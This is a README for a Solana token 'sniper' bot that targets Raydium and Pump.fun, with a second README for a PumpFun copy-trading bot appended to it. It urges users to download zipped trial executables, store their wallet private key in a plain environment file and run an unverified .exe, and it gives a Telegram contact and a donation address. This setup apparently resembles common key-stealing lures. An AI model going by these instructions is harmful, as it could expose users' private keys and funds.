# Solana Ultra-Fast New Token Sniper on Raydium and Pump.fun in Rust 🚀

## Overview

Introducing the **Solana Ultra-Fast New Token Sniper** written in **Rust** 🦀, designed to detect newly launched tokens on both **Raydium** and **Pump.fun** and execute buys at lightning speed ⚡. With Rust's memory safety features and performance optimizations, built with Rust for superior performance and security. Tailored for both novice and experienced traders.

---

## Key Features

### 🚀 Speed and Efficiency
- **Lightning-Quick Transactions**: Leveraging Rust's exceptional performance, our bot allows you to snipe new tokens almost instantly. Say goodbye to delays and seize opportunities as they arise!

### 🔒 Safety First
- **Robust Security**: Rust's safety guarantees minimize bugs and vulnerabilities, ensuring your trading activities are secure. Trade with confidence and peace of mind.

### 📊 Multiple gRPC Connections
- **Stay Updated**: Effortlessly connect to top Solana data providers like **Helius** and **Yellowstone** through multiple gRPC connections. Get real-time updates and make informed trading decisions.

### 👩‍💻 User-Friendly Interface
- **Intuitive Design**: Our sniper bot features a clean and accessible interface, making it easy for users of all experience levels to navigate. Start trading in no time!

### 🛠️ Rich Utilities
- **Advanced Features**:
  - **jito-confirm**: Engage in low-latency transactions on platforms like Raydium and Pumpfun.
  - **jito-bundle**: Bundle buy/sell actions with up to **20 wallets** in Raydium/Pumpfun, enhancing your trading strategy and flexibility.

---

## Directory Structure

```
src/
├── core/
│   ├── token.rs        # Token definitions and handling
│   └── tx.rs        # Transaction handling
| 
├── engine/
│   ├── swap.rs        # Token swap(buy/sell) functionalities in various Dexs
│   └── monitor        # New token monitoring(and parse tx) in Dexs using geyser rpc, and normal rpc
│       └── helius.rs        # Helius gRpc for tx listen and parse.
│       └── yellowstone.rs        # Yellowstone gRpc for tx listen and parse.
|
├── dex/
│   ├── pump_fun.rs        # Pump.fun
│   ├── raydium.rs        # Raydium
│   ├── meteora.rs        # Meteora
│   └── orca.rs        # Orca
│
├── services/
│   ├── jito.rs        # Jito service provides ultra-fast transaction confirmation
│   └── nextblock.rs        # NextBlock service provides the ultra-fast transaction confirmation in unique way
|
├── common/
│   ├── logger.rs        # Logs to be clean and convenient to monitor.
│   └── utils.rs        # Utility functions used across the project
│
├── lib.rs
└── main.rs
```
---
## Trial Versions

### 1. **Solana RayPump Sniper (Executioner Trial)**  
> 🗂️ [solana-raypump-sniper(executioner-trial).zip](https://github.com/user-attachments/files/18854180/solana-raypump-sniper.executioner-trial.zip)

**Strategy Details:**
- **Entry Trigger:** Monitor user purchases of tokens valued at $1,000; execute a buy order upon detection.
- **Exit Trigger:** Monitor user sales of tokens valued at $300; execute a sell order upon detection.
- **Time Limitation:** If a position remains open for more than 60 seconds, initiate an automatic sell.  
*(Note: The $1,000 and $300 purchase/sale thresholds, as well as the 60-second time limit, are adjustable parameters via environment settings.)*

---

### 2. **Solana RayPump Sniper (Qwert Trial)**  
> 🗂️ [solana-raypump-sniper(qwert-trial).zip](https://github.com/user-attachments/files/18854181/solana-raypump-sniper.qwert-trial.zip)

**Strategy Details:**
1. **Entry:** Enter a position based on your analysis and market conditions.
2. **Time Limit:** Set a 3-5 minute limit after entering a position. During this period, monitor the volume and transaction count.
3. **Exit Strategy:**
   * **Time-Based Exit:** If volume does not increase after 3 minutes, sell the position.
   * **Growth-Based Exit:** If growth in volume appears, disable the time-based exit rule:
     * **Take Profit (TP):** Set 5-7 Take Profit orders to secure gains.
     * **Stop Loss (SL):** Implement a 50% Stop Loss to mitigate potential losses.

*(Note: All parameters mentioned above can be customized within the environment settings.)*

---

### How To Run
1. Environment Variables Settings
```plaintext
PRIVATE_KEY=your_private_key_here
RPC_HTTPS=https://mainnet.helius-rpc.com/?api-key=your_api_key_here
RPC_WSS=wss://atlas-mainnet.helius-rpc.com/?api-key=your_api_key_here
SLIPPAGE=10
JITO_BLOCK_ENGINE_URL=https://ny.mainnet.block-engine.jito.wtf
JITO_TIP_STREAM_URL=ws://bundles-api-rest.jito.wtf/api/v1/bundles/tip_stream
JITO_TIP_PERCENTILE=50
JITO_TIP_VALUE=0.004
BUY_THRESHOLD=1000
SELL_THRESHOLD=300
TIME_EXCEED=60
TOKEN_AMOUNT=0.000001
```
2. Add the wallet address you want to block on a new line and save the file.
```
0x1234567890abcdef1234567890abcdef12345678
0xabcdef1234567890abcdef1234567890abcdef12
```
3. Run `solana-raypump-sniper(trial).exe`.

![image](https://github.com/user-attachments/assets/dffc8e4b-cd00-4921-8488-e25230f4a31a)

---
## Donate

👉👌 6vT7nrqtbXDWVc8cRUtifxgfDZi19aW7qhcZg2hSepwb

---
## Support

As the experimental result, the best environment for running this bot is to use `dedicated server located in NY`. 
For support and further inquiries, please connect via Telegram: 📞 [jwest951227](https://t.me/jwest951227).

## Scam Report

https://github.com/Solana-Sniper-Bot-Download/Solana-Raydium-Pumpfun-Sniper-Bot/issues/2

# PumpFun Copy Trading Bot

A high-performance copy trading bot for PumpFun DEX that monitors specific wallet activities.

## Features

- Real-time monitoring of target wallet: `o7RY6P2vQMuGSu1TrLM81weuzgDjaCRTXYRaXJwWcvc`
- Fast transaction execution using Jito MEV
- Automatic trade copying on PumpFun DEX

## Setup

1. Copy `.env.example` to `.env` and fill in your values:
```bash
cp .env.example .env
```

2. Build the project:
```bash
cargo build --release
```

3. Run the bot:
```bash
./target/release/pumpfun-copy
```

## Environment Variables

Required environment variables in `.env`:
- `RPC_WSS`: WebSocket RPC URL
- `RPC_HTTPS`: HTTPS RPC URL
- `PRIVATE_KEY`: Your wallet's private key
- `SLIPPAGE`: Slippage tolerance (default: 5)
- `JITO_BLOCK_ENGINE_URL`: Jito block engine URL
- `JITO_TIP_STREAM_URL`: Jito tip stream URL
- `JITO_TIP_VALUE`: Jito tip value (default: 0.004)
